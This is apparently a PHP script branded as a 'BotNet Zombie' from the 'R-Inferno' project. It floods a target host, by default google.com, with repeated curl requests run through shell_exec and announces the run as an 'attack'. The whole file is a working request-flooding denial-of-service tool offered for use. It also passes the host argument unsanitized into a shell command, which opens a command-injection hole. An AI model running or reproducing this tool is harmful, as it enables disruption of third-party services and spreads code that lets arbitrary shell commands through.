<?php

class RNet {
    private $host;
    private $req;

    public function __construct($host, $req = 10) {
        $this->host = $host;
        $this->req = $req;
        $this->printBanner();
    }

    private function printBanner() {
        echo "
		    ____        ____      ____                    
		   / __ \      /  _/___  / __/__  _________  ____
		  / /_/ /_____ / // __ \/ /_/ _ \/ ___/ __ \/ __ \
		 / _, _/_____// // / / / __/  __/ /  / / / / /_/ /
		/_/ |_|     /___/_/ /_/_/  \___/_/  /_/ /_/\____/

            https://github.com/Rezn0y/R-Inferno v1.0.0

                    Rezn0y: R-Inferno Project
                    R-Inferno BotNet Zombie ϟϟ

                                            \n";
    }

    public function start() {
        echo "Starting attack to {$this->host} with {$this->req} requests.";
        for ($i = 0; $i < $this->req; $i++) {
            $output = shell_exec("curl -L -s {$this->host}");
            echo $output;
            sleep(0.01); // Wait 0.01 second
        }
        echo "Attack completed.";
    }
}

$options = getopt("", ["host:", "req::"]);

$host = $options['host'] ?? 'google.com';
$req = $options['req'] ?? 10;

$rnet = new RNet($host, $req);
$rnet->start();

?>
